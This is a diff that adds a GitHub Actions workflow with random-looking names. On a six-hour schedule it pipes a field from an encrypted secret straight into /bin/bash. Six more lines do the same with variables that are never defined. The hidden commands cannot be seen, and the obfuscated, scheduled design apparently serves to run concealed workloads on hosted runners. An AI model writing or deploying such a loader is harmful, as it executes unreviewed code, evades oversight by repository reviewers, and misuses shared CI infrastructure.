@@ -1,0 +1,24 @@
+name: mingweiqiaowuu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mingweiqiaowuu
+        env:
+          z1: ${{ secrets.z1 }}
+        run: |
+          echo $z1 | jq -r .cs0 | /bin/bash
+          echo $jbf3 | jq -r .lxkk15 | /bin/bash
+          echo $tnm81 | jq -r .hir69957 | /bin/bash
+          echo $zdc04010 | jq -r .fgjnw0795 | /bin/bash
+          echo $rbcr2 | jq -r .e0902 | /bin/bash
+          echo $e9731 | jq -r .mddt9776 | /bin/bash
+          echo $d97026 | jq -r .it80997 | /bin/bash
+
